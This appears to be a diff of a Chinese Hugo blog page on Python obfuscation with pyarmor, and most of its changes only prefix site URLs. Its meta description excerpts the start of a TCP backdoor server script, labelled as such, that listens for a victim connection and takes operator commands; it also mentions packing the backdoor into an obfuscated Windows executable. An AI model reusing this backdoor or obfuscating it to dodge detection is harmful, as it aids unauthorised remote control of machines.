@@ -30,7 +30,7 @@ pyarmor打包混淆原理，其收费版本混淆无规则，开源免费版本�
 准备工作 一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。
 server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- import socket,subprocess as sp,sys # 导入subprocess，socket模块 # 1）监听信息 host = sys.argv[1] # 攻击者地址，通常留空&#39;&#39; port = int(sys.argv[2]) # 攻击者主机端口 # 2）套接字部分 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字 s.bind((host,port)) # 绑定套接字 s.listen(100) # 最大连接数:100 conn,addr = s.accept() # 接收客户端连接 # 3）输出连接信息 print &#34;[&#43;] Conection Established from: %s&#34; % (str(addr[0])) # 打印攻击者的连接信息 # 4）接收输出 while 1: # 运行死循环初始化反向的连接 command = raw_input(&#34;#&gt; &#34;) # 服务器输入 # 5）if判断-1 if command !" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/" />
+<meta property="og:url" content="liodair.github.io/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/" />
 
 <meta property="og:image" content="https://picsum.photos/1024/768/?random" />
 <meta property="article:published_time" content="2018-10-25T17:06:13&#43;08:00"/>
@@ -44,15 +44,15 @@ pyarmor打包混淆原理，其收费版本混淆无规则，开源免费版本�
 准备工作 一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。
 server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- import socket,subprocess as sp,sys # 导入subprocess，socket模块 # 1）监听信息 host = sys.argv[1] # 攻击者地址，通常留空&#39;&#39; port = int(sys.argv[2]) # 攻击者主机端口 # 2）套接字部分 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字 s.bind((host,port)) # 绑定套接字 s.listen(100) # 最大连接数:100 conn,addr = s.accept() # 接收客户端连接 # 3）输出连接信息 print &#34;[&#43;] Conection Established from: %s&#34; % (str(addr[0])) # 打印攻击者的连接信息 # 4）接收输出 while 1: # 运行死循环初始化反向的连接 command = raw_input(&#34;#&gt; &#34;) # 服务器输入 # 5）if判断-1 if command !"/>
 
-	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-	<link rel="manifest" href="/site.webmanifest">
-	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
-	<link rel="shortcut icon" href="/favicon.ico">
+	<link rel="apple-touch-icon" sizes="180x180" href="/liodair.github.io/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/liodair.github.io/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/liodair.github.io/favicon-16x16.png">
+	<link rel="manifest" href="/liodair.github.io/site.webmanifest">
+	<link rel="mask-icon" href="/liodair.github.io/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/liodair.github.io/favicon.ico">
 
 	<title>有趣的python混淆</title>
-	<link rel="stylesheet" href="/css/style.min.31706917653d2b9e8410abd431f30ec4359a88a94fc87a63654779d87329edec.css" integrity="sha256-MXBpF2U9K56EEKvUMfMOxDWaiKlPyHpjZUd52HMp7ew=">
+	<link rel="stylesheet" href="/liodair.github.io/css/style.min.31706917653d2b9e8410abd431f30ec4359a88a94fc87a63654779d87329edec.css" integrity="sha256-MXBpF2U9K56EEKvUMfMOxDWaiKlPyHpjZUd52HMp7ew=">
 	<style>.bg-img {background-image: url('https://picsum.photos/1024/768/?random');}</style>
 </head>
 
@@ -62,12 +62,12 @@ server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- impor
 		<div class="hdr-wrapper section-inner">
 			<div class="hdr-left">
 				<div class="site-branding">
-					<a href="/">Liod &#39;s Blog</a>
+					<a href="liodair.github.io/">Liod &#39;s Blog</a>
 				</div>
 				<nav class="site-nav hide-in-mobile">
-					<a href="/posts/">Posts</a>
-					<a href="/about/">About</a>
-					<a href="/friends/">Friends</a>
+					<a href="liodair.github.io/posts/">Posts</a>
+					<a href="liodair.github.io/about/">About</a>
+					<a href="liodair.github.io/friends/">Friends</a>
 				</nav>
 			</div>
 			<div class="hdr-right hdr-icons">
@@ -77,9 +77,9 @@ server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- impor
 	</header>
 	<div id="mobile-menu" class="animated fast">
 		<ul>
-			<li><a href="/posts/">Posts</a></li>
-			<li><a href="/about/">About</a></li>
-			<li><a href="/friends/">Friends</a></li>
+			<li><a href="liodair.github.io/posts/">Posts</a></li>
+			<li><a href="liodair.github.io/about/">About</a></li>
+			<li><a href="liodair.github.io/friends/">Friends</a></li>
 		</ul>
 	</div>
 
@@ -223,10 +223,10 @@ pyinstaller 打包成一个文件的原理也不是直接所有打包，他运�
 			</footer>
 		</article>
 		<div class="post-nav thin">
-			<a class="next-post" href="/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
+			<a class="next-post" href="liodair.github.io/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
 				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>Hugo&#43;github_pages搭建博客</span>
 			</a>
-			<a class="prev-post" href="/posts/post-with-featured-image/">
+			<a class="prev-post" href="liodair.github.io/posts/post-with-featured-image/">
 				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Post With Featured Image</span>
 			</a>
 		</div>
@@ -235,14 +235,14 @@ pyinstaller 打包成一个文件的原理也不是直接所有打包，他运�
 	</main>
 
 	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-		<p>&copy; 2019 <a href="/">Lioders</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>&copy; 2019 <a href="liodair.github.io/">Lioders</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
 		<p>
-			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="liodair.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
 		</p>
 	</footer>
 
 
-	<script src="/js/main.min.784417f5847151f848c339cf0acb13a06cbb648b1483435a28ed4556c4ead69b.js" integrity="sha256-eEQX9YRxUfhIwznPCssToGy7ZIsUg0NaKO1FVsTq1ps="></script>
+	<script src="/liodair.github.io/js/main.min.784417f5847151f848c339cf0acb13a06cbb648b1483435a28ed4556c4ead69b.js" integrity="sha256-eEQX9YRxUfhIwznPCssToGy7ZIsUg0NaKO1FVsTq1ps="></script>
 
 </body>
 
